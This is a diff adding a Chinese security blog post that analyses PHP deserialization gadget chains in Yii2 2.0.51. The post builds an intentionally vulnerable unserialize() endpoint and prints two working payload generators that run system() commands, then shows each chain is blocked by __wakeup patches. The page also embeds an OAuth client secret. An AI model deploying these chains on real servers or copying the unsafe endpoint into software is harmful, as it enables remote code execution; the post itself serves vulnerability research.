@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>[Yii2]反序列化链分析 | fallingskies</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1783248062137">
+<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="环境搭建
+ composer create-project yiisoft/yii2-app-basic yii2
+
+安装后版本是2.0.51
+phpstorm启动时Document root填web目录
+在controllers/Site..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://fallingskies22.github.io">
+        <img src="https://fallingskies22.github.io/images/avatar.png?v=1783248062137" class="site-logo">
+        <h1 class="site-title">fallingskies</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/post/friends" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      <h3>想要去月球<h3>
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">[Yii2]反序列化链分析</h2>
+            <div class="post-date">2024-08-20</div>
+            
+              <div class="feature-container" style="background-image: url('https://fallingskies22.github.io/post-images/yii2-fan-xu-lie-hua-lian-fen-xi.png')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="环境搭建">环境搭建</h2>
+<pre><code> composer create-project yiisoft/yii2-app-basic yii2
+</code></pre>
+<p>安装后版本是<code>2.0.51</code><br>
+phpstorm启动时<code>Document root</code>填<code>web</code>目录</p>
+<p>在<code>controllers/SiteController.php</code>添加反序列化入口</p>
+<pre><code class="language-php">public function actionUnserialize()
+    {
+        return unserialize(base64_decode(Yii::$app-&gt;request-&gt;get(&quot;data&quot;)));
+    }
+</code></pre>
+<p>通过<code>index.php/?r=site/unserialize</code>访问</p>
+<h2 id="分析">分析</h2>
+<p>发现这里也有之前Larvel中的<code>ValidGenerator</code>来触发<code>__call()</code>方法执行命令。</p>
+<p>找一个<code>__destruct()</code><br>
+<code>vendor/yiisoft/yii2/db/BatchQueryResult.php</code></p>
+<pre><code class="language-php">/**
+     * Destructor.
+     */
+    public function __destruct()
+    {
+        // make sure cursor is closed
+        $this-&gt;reset();
+    }
+
+    /**
+     * Resets the batch query.
+     * This method will clean up the existing batch query so that a new batch query can be performed.
+     */
+    public function reset()
+    {
+        if ($this-&gt;_dataReader !== null) {
+            $this-&gt;_dataReader-&gt;close();
+        }
+        $this-&gt;_dataReader = null;
+        $this-&gt;_batch = null;
+        $this-&gt;_value = null;
+        $this-&gt;_key = null;
+        $this-&gt;trigger(self::EVENT_RESET);
+    }
+</code></pre>
+<p>exp</p>
+<pre><code class="language-php">&lt;?php
+namespace yii\db{
+    use Faker\ValidGenerator;
+    class BatchQueryResult
+    {
+        private $_dataReader;
+        public function __construct($cmd)
+        {
+            $this-&gt;_dataReader = new ValidGenerator($cmd);
+        }
+    }
+    echo urlencode(serialize(new BatchQueryResult(&quot;whoami&quot;)));
+}
+
+namespace Faker{
+    class DefaultGenerator{
+        protected $default;
+        public function __construct($cmd)
+        {
+            $this-&gt;default = $cmd;
+        }
+    }
+    class ValidGenerator
+    {
+        protected $generator;
+        protected $validator;
+        protected $maxRetries;
+        public function __construct($cmd){
+            $this-&gt;generator=new DefaultGenerator($cmd);
+            $this-&gt;maxRetries=9;
+            $this-&gt;validator='system';
+        }
+    }
+}
+?&gt;
+</code></pre>
+<p>但是别高兴太早😥</p>
+<p>发现这里已经被修复了</p>
+<pre><code>/**
+     * Unserialization is disabled to prevent remote code execution in case application
+     * calls unserialize() on user input containing specially crafted string.
+     * @see https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15148
+     * @since 2.0.38
+     */
+    public function __wakeup()
+    {
+        throw new \BadMethodCallException('Cannot unserialize ' . __CLASS__);
+    }
+</code></pre>
+<p>看看发现<code>SmtpTransport</code>也是使用wakeup修复了。好多地方都是😟</p>
+<p>找找其他的<code>__destruct()</code></p>
+<p><code>vendor/codeception/codeception/ext/RunProcess.php</code></p>
+<pre><code class="language-php">&lt;?php
+namespace Faker{
+    class DefaultGenerator{
+        protected $default;
+        public function __construct($cmd)
+        {
+            $this-&gt;default = $cmd;
+        }
+    }
+    class ValidGenerator
+    {
+        protected $generator;
+        protected $validator;
+        protected $maxRetries;
+        public function __construct($cmd){
+            $this-&gt;generator=new DefaultGenerator($cmd);
+            $this-&gt;maxRetries=9;
+            $this-&gt;validator='system';
+        }
+    }
+}
+
+namespace Codeception\Extension{
+    use Faker\ValidGenerator;
+    class RunProcess{
+        private $processes = [] ;
+        function __construct($cmd)
+        {
+            $this-&gt;processes[] = new ValidGenerator($cmd);
+        }
+    }
+    echo(base64_encode(serialize(new RunProcess('ls /'))));
+}
+</code></pre>
+<p>这里也是被修复了</p>
+<pre><code class="language-php">/**
+     * Disable the deserialization of the class to prevent attacker executing
+     * code by leveraging the __destruct method.
+     *
+     * @see https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection
+     */
+    public function __wakeup()
+    {
+        throw new \BadMethodCallException('Cannot unserialize ' . __CLASS__);
+    }
+</code></pre>
+<p>入口点基本全被过滤了🤷‍♂</p>
+<p>看看其他入口<code>__wakeup</code>类型，有一个利用<code>UnicodeString::__wakeup</code>作为入口的链</p>
+<p>发现这里也是被过滤了</p>
+<pre><code class="language-php">    public function __wakeup()
+    {
+        if (!\is_string($this-&gt;string)) {
+            throw new \BadMethodCallException('Cannot unserialize '.__CLASS__);
+        }
+
+        normalizer_is_normalized($this-&gt;string) ?: $this-&gt;string = normalizer_normalize($this-&gt;string);
+    }
+</code></pre>
+<p>太狠了，Yii2修链修这么多，感觉已经无敌了现在，等以后看引入新的依赖吧😭</p>
+<h2 id="参考文章">参考文章</h2>
+<p>https://xz.aliyun.com/t/9420</p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://fallingskies22.github.io/post/idekctf-2024-web/">
+                  <h3 class="post-title">
+                    idekCTF 2024 - Web
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '1b08861b8ad19018640e',
+        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
+        repo: 'fallingskies22.github.io',
+        owner: 'fallingskies22',
+        admin: ['fallingskies22'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
